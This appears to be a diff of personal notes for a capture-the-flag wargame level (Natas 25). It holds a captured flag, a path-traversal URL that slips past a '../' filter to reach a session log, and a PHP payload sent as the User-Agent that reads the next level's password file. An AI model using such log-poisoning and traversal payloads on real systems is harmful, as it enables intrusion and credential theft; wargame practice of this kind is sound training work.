@@ -1,1 +1,10 @@
+FLAG:
 GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+HINTS:
+
+URL:
+...//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_<YOUR_PHPSESSID>.log
+
+USER-AGENT:
+<?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
